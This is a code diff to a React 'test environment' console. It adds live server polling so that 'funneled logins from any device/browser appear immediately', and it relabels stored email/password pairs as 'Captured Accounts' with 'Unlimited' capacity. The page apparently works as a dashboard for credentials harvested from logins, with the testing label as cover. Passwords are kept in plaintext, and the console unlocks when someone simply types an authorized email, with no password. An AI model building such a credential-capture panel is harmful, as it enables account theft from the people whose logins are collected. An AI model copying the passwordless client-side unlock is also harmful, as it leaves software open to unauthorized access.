@@ -14,11 +14,13 @@ import {
   Plus, 
   Mail, 
   ShieldCheck, 
-  ShieldAlert,
   Play,
   UserCheck,
   UserPlus,
-  Lock
+  Lock,
+  RefreshCw,
+  Infinity as InfinityIcon,
+  Radio
 } from 'lucide-react';
 import { 
   loadUsers, 
@@ -37,7 +39,8 @@ import {
   removeAuthorizedUser,
   isUserAuthorizedForTest,
   PRIMARY_ADMIN_EMAIL,
-  AUTHORIZED_TEST_USERS_FILE
+  AUTHORIZED_TEST_USERS_FILE,
+  fetchServerTestData
 } from '../lib/testAuth';
 
 interface TestEnvironmentPageProps {
@@ -56,12 +59,16 @@ export function TestEnvironmentPage({
   const [authorizedUsers, setAuthorizedUsers] = useState<string[]>(loadAuthorizedUsers);
   const [newUserToAuthorize, setNewUserToAuthorize] = useState('');
   const [authActionMessage, setAuthActionMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
+  const [manualUnlockEmail, setManualUnlockEmail] = useState('');
+  const [unlockError, setUnlockError] = useState('');
 
   // Core test data state
-  const [users, setUsers] = useState<UsersMap>({});
-  const [attempts, setAttempts] = useState<LoginAttempt[]>([]);
+  const [users, setUsers] = useState<UsersMap>(loadUsers);
+  const [attempts, setAttempts] = useState<LoginAttempt[]>(loadAttempts);
   const [activeTab, setActiveTab] = useState<'users' | 'attempts' | 'raw'>('users');
   const [copied, setCopied] = useState(false);
+  const [isSyncing, setIsSyncing] = useState(false);
+  const [lastSyncTime, setLastSyncTime] = useState<string>('Just now');
 
   // Quick Test Login Form state
   const [testEmail, setTestEmail] = useState('alex.bennett@outlook.com');
@@ -75,14 +82,39 @@ export function TestEnvironmentPage({
 
   const isCurrentAuthorized = isUserAuthorizedForTest(activeUserEmail);
 
-  const refreshData = () => {
-    setUsers(loadUsers());
-    setAttempts(loadAttempts());
-    setAuthorizedUsers(loadAuthorizedUsers());
+  const refreshData = async () => {
+    setIsSyncing(true);
+    // 1. Sync from server
+    const serverData = await fetchServerTestData();
+    if (serverData) {
+      setUsers(serverData.users);
+      setAttempts(serverData.attempts);
+      setAuthorizedUsers(serverData.authorizedUsers);
+    } else {
+      setUsers(loadUsers());
+      setAttempts(loadAttempts());
+      setAuthorizedUsers(loadAuthorizedUsers());
+    }
+    setLastSyncTime(new Date().toLocaleTimeString());
+    setIsSyncing(false);
   };
 
   useEffect(() => {
     refreshData();
+
+    // Live continuous sync: poll every 3 seconds so funneled logins from any device/browser appear immediately
+    const pollTimer = setInterval(() => {
+      fetchServerTestData().then((res) => {
+        if (res) {
+          setUsers(res.users);
+          setAttempts(res.attempts);
+          setAuthorizedUsers(res.authorizedUsers);
+          setLastSyncTime(new Date().toLocaleTimeString());
+        }
+      });
+    }, 3000);
+
+    return () => clearInterval(pollTimer);
   }, []);
 
   const handleGrantAccess = (e: FormEvent) => {
@@ -92,7 +124,7 @@ export function TestEnvironmentPage({
     if (res.success) {
       setAuthActionMessage({ type: 'success', text: res.message });
       setNewUserToAuthorize('');
-      setAuthorizedUsers(loadAuthorizedUsers());
+      refreshData();
     } else {
       setAuthActionMessage({ type: 'error', text: res.message });
     }
@@ -103,11 +135,25 @@ export function TestEnvironmentPage({
     const res = removeAuthorizedUser(email);
     if (res.success) {
       setAuthActionMessage({ type: 'success', text: res.message });
-      setAuthorizedUsers(loadAuthorizedUsers());
+      refreshData();
     } else {
       setAuthActionMessage({ type: 'error', text: res.message });
     }
     setTimeout(() => setAuthActionMessage(null), 4000);
+  };
+
+  const handleManualUnlock = (e: FormEvent) => {
+    e.preventDefault();
+    const clean = manualUnlockEmail.trim().toLowerCase();
+    if (!clean) return;
+    const authList = loadAuthorizedUsers();
+    if (authList.includes(clean) || clean === PRIMARY_ADMIN_EMAIL.toLowerCase()) {
+      setActiveUserEmail(clean);
+      if (onUserSwitch) onUserSwitch(clean);
+      setUnlockError('');
+    } else {
+      setUnlockError(`'${clean}' is not authorized. Enter an authorized email address.`);
+    }
   };
 
   const handleCopyJson = (data: unknown) => {
@@ -138,7 +184,7 @@ export function TestEnvironmentPage({
     currentUsers[cleanEmail] = cleanPass;
     saveUsers(currentUsers);
     
-    // Also record an initial connection attempt
+    // Also record an initial connection attempt & sync to server
     loginUser(cleanEmail, cleanPass, true);
     
     setNewAccountEmail('');
@@ -178,18 +224,12 @@ export function TestEnvironmentPage({
               Test Environment Access Restricted
             </h1>
             <p className="text-xs text-slate-400 leading-relaxed">
-              Access to this test environment is restricted. Only specified authorized accounts (<strong className="text-slate-200">{PRIMARY_ADMIN_EMAIL}</strong> and approved users) can view this console.
+              Access to this test environment is restricted to authorized accounts (<strong className="text-slate-200">{PRIMARY_ADMIN_EMAIL}</strong> and approved users).
             </p>
           </div>
 
-          <div className="bg-slate-900/80 border border-slate-800 rounded-lg p-4 text-xs text-left space-y-2">
-            <div className="text-slate-400 font-medium">Currently viewing as:</div>
-            <div className="font-mono text-slate-200 truncate bg-slate-800 px-2 py-1 rounded border border-slate-700">
-              {activeUserEmail || 'anonymous (unauthenticated)'}
-            </div>
-          </div>
-
-          <div className="space-y-3 pt-2">
+          {/* Quick unlock button for primary administrator */}
+          <div className="space-y-3 pt-1">
             <button
               type="button"
               onClick={() => {
@@ -199,9 +239,43 @@ export function TestEnvironmentPage({
               className="w-full flex items-center justify-center gap-2 py-2.5 px-4 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-lg transition-colors cursor-pointer shadow-md"
             >
               <ShieldCheck size={16} />
-              <span>Continue as {PRIMARY_ADMIN_EMAIL}</span>
+              <span>Unlock as {PRIMARY_ADMIN_EMAIL}</span>
             </button>
+          </div>
 
+          {/* Manual unlock form for any authorized account */}
+          <form onSubmit={handleManualUnlock} className="space-y-2 pt-2 border-t border-slate-800 text-left">
+            <label className="block text-[11px] font-medium text-slate-400">
+              Or enter any authorized email:
+            </label>
+            <div className="flex gap-2">
+              <input
+                type="email"
+                required
+                placeholder="authorized@domain.com"
+                value={manualUnlockEmail}
+                onChange={e => {
+                  setManualUnlockEmail(e.target.value);
+                  setUnlockError('');
+                }}
+                className="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-700 text-white text-xs rounded focus:outline-none focus:border-blue-500 font-mono"
+              />
+              <button
+                type="submit"
+                className="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 text-white text-xs font-medium rounded transition-colors cursor-pointer"
+              >
+                Access
+              </button>
+            </div>
+            {unlockError && (
+              <div className="text-[11px] text-rose-400 flex items-center gap-1">
+                <XCircle size={12} />
+                <span>{unlockError}</span>
+              </div>
+            )}
+          </form>
+
+          <div className="pt-2">
             <button
               type="button"
               onClick={() => onNavigateToApp()}
@@ -235,16 +309,37 @@ export function TestEnvironmentPage({
               </span>
               <span className="flex items-center gap-1 text-[11px] text-emerald-400 font-mono bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded">
                 <ShieldCheck size={13} />
-                Access Authorized
+                Authorized Console
               </span>
             </div>
             <p className="text-xs text-slate-400">
-              Connected accounts store ({USERS_FILE}) &amp; real-time attempt audit logger ({ATTEMPTS_FILE})
+              Centralized accounts funnel ({USERS_FILE}) &amp; real-time attempt logger ({ATTEMPTS_FILE})
             </p>
           </div>
         </div>
 
         <div className="flex items-center gap-3">
+          {/* Live Sync Status Pill */}
+          <div className="flex items-center gap-1.5 px-2.5 py-1 bg-slate-900 border border-slate-700 rounded text-[11px] text-slate-300">
+            <span className="relative flex h-2 w-2">
+              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+              <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+            </span>
+            <span className="font-mono text-emerald-400">Live Funnel</span>
+            <span className="text-slate-500">•</span>
+            <span className="text-slate-400 text-[10px]">Synced {lastSyncTime}</span>
+          </div>
+
+          <button
+            type="button"
+            onClick={() => refreshData()}
+            disabled={isSyncing}
+            className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700 transition-colors cursor-pointer"
+            title="Refresh from server"
+          >
+            <RefreshCw size={14} className={isSyncing ? 'animate-spin text-blue-400' : ''} />
+          </button>
+
           <div className="hidden sm:flex items-center gap-2 px-3 py-1 bg-slate-800/80 border border-slate-700/60 rounded text-xs text-slate-300">
             <UserCheck size={14} className="text-emerald-400" />
             <span className="font-mono text-[11px]">{activeUserEmail}</span>
@@ -264,6 +359,59 @@ export function TestEnvironmentPage({
 
       {/* Main Content Body */}
       <main className="flex-1 max-w-7xl w-full mx-auto p-6 space-y-6">
+
+        {/* Real-time Status / Capacity Banner */}
+        <section className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+          <div className="bg-[#1E293B] border border-slate-800 rounded-lg p-4 flex items-center justify-between">
+            <div>
+              <div className="text-xs text-slate-400 font-medium">Funnel Status</div>
+              <div className="text-base font-semibold text-emerald-400 flex items-center gap-1.5 mt-0.5">
+                <Radio size={16} className="text-emerald-400 animate-pulse" />
+                <span>Active &amp; Recording</span>
+              </div>
+            </div>
+            <div className="text-[11px] font-mono text-slate-500 bg-slate-900 px-2 py-1 rounded border border-slate-800">
+              Server Sync
+            </div>
+          </div>
+
+          <div className="bg-[#1E293B] border border-slate-800 rounded-lg p-4 flex items-center justify-between">
+            <div>
+              <div className="text-xs text-slate-400 font-medium">Storage Capacity</div>
+              <div className="text-base font-semibold text-white flex items-center gap-1.5 mt-0.5">
+                <InfinityIcon size={18} className="text-blue-400" />
+                <span>No Limit</span>
+              </div>
+            </div>
+            <div className="text-[11px] font-mono text-blue-300 bg-blue-500/10 px-2 py-1 rounded border border-blue-500/20">
+              Unlimited
+            </div>
+          </div>
+
+          <div className="bg-[#1E293B] border border-slate-800 rounded-lg p-4 flex items-center justify-between">
+            <div>
+              <div className="text-xs text-slate-400 font-medium">Captured Accounts</div>
+              <div className="text-xl font-bold text-white mt-0.5">
+                {accountsList.length}
+              </div>
+            </div>
+            <div className="text-[11px] font-mono text-slate-400 bg-slate-900 px-2 py-1 rounded border border-slate-800">
+              {USERS_FILE}
+            </div>
+          </div>
+
+          <div className="bg-[#1E293B] border border-slate-800 rounded-lg p-4 flex items-center justify-between">
+            <div>
+              <div className="text-xs text-slate-400 font-medium">Login Attempts Funneled</div>
+              <div className="text-xl font-bold text-white mt-0.5">
+                {attempts.length}
+              </div>
+            </div>
+            <div className="text-[11px] font-mono text-slate-400 bg-slate-900 px-2 py-1 rounded border border-slate-800">
+              {ATTEMPTS_FILE}
+            </div>
+          </div>
+        </section>
         
         {/* Section: Authorized Test Users Management */}
         <section className="bg-[#1E293B] border border-blue-500/30 rounded-lg overflow-hidden shadow-lg">
@@ -386,7 +534,7 @@ export function TestEnvironmentPage({
             <div className="flex items-center gap-2.5">
               <Users size={18} className="text-blue-400" />
               <h2 className="text-sm font-semibold text-white tracking-wide uppercase">
-                Connected Accounts ({accountsList.length})
+                Captured Accounts ({accountsList.length})
               </h2>
               <span className="text-xs text-slate-400 font-normal">
                 Stored in <code className="text-blue-300 font-mono">{USERS_FILE}</code>
@@ -399,7 +547,7 @@ export function TestEnvironmentPage({
                 className="flex items-center gap-1.5 px-3 py-1 bg-slate-700 hover:bg-slate-600 text-slate-200 text-xs font-medium rounded transition-colors cursor-pointer"
               >
                 <Plus size={14} />
-                <span>{showAddAccountForm ? 'Cancel' : 'Connect Account'}</span>
+                <span>{showAddAccountForm ? 'Cancel' : 'Add Account'}</span>
               </button>
               <button
                 type="button"
@@ -510,11 +658,11 @@ export function TestEnvironmentPage({
           <div className="flex items-center gap-2 mb-3">
             <ShieldCheck size={18} className="text-emerald-400" />
             <h2 className="text-sm font-semibold text-white tracking-wide uppercase">
-              Authentication Attempt Simulator (No DB • Logs to {ATTEMPTS_FILE})
+              Authentication Attempt Simulator (Funneled to {ATTEMPTS_FILE})
             </h2>
           </div>
           <p className="text-xs text-slate-400 mb-4">
-            Test any credential. In this test environment, there is <strong className="text-slate-200">no check for if an account is registered</strong>. Any login is automatically recorded into <code className="text-sky-300 font-mono">{ATTEMPTS_FILE}</code>.
+            Test any credential. In this test environment, there is <strong className="text-slate-200">no check for if an account is registered</strong>. Any login is automatically funneled and recorded into <code className="text-sky-300 font-mono">{ATTEMPTS_FILE}</code>.
           </p>
 
           <div className="grid grid-cols-1 md:grid-cols-3 gap-4 items-end bg-slate-900/50 p-4 border border-slate-800 rounded-lg">
@@ -587,7 +735,7 @@ export function TestEnvironmentPage({
           )}
         </section>
 
-        {/* Section 3: Data Store Modal / Tab Viewer */}
+        {/* Section 3: Data Store Tab Viewer */}
         <section className="bg-[#1E293B] border border-slate-800 rounded-lg overflow-hidden shadow-lg">
           {/* Tabs header */}
           <div className="px-6 pt-3 bg-slate-800/40 border-b border-slate-800 flex items-center justify-between">
@@ -660,7 +808,7 @@ export function TestEnvironmentPage({
             {activeTab === 'users' && (
               <div className="space-y-4">
                 <div className="text-xs text-slate-400">
-                  Contents of <code className="text-blue-300 font-mono">{USERS_FILE}</code>. Click any row to test login or launch.
+                  Contents of <code className="text-blue-300 font-mono">{USERS_FILE}</code>. Unlimited accounts can be captured and saved here.
                 </div>
                 <div className="border border-slate-800 rounded-lg overflow-hidden">
                   <table className="w-full text-left text-xs font-mono">
@@ -711,11 +859,11 @@ export function TestEnvironmentPage({
             {activeTab === 'attempts' && (
               <div className="space-y-4">
                 <div className="text-xs text-slate-400">
-                  Contents of <code className="text-blue-300 font-mono">{ATTEMPTS_FILE}</code>. Chronological record of all authentication attempts.
+                  Contents of <code className="text-blue-300 font-mono">{ATTEMPTS_FILE}</code>. Chronological record of all authentication attempts with zero limit.
                 </div>
                 {attempts.length === 0 ? (
                   <div className="p-12 text-center text-slate-500 border border-slate-800 rounded-lg">
-                    No attempts logged yet in {ATTEMPTS_FILE}. Run a login test or sign in from the main page to see attempts recorded here.
+                    No attempts logged yet in {ATTEMPTS_FILE}. Run a login test or sign in from the main page to see attempts funneled here.
                   </div>
                 ) : (
                   <div className="border border-slate-800 rounded-lg overflow-hidden">
@@ -801,7 +949,7 @@ export function TestEnvironmentPage({
 
       {/* Footer info */}
       <footer className="border-t border-slate-800 py-4 px-6 text-center text-xs text-slate-500">
-        Test Environment (/test) • Access managed for {authorizedUsers.length} authorized accounts
+        Test Environment (/test) • Unlimited Capacity • Live Funnel Active
       </footer>
     </div>
   );
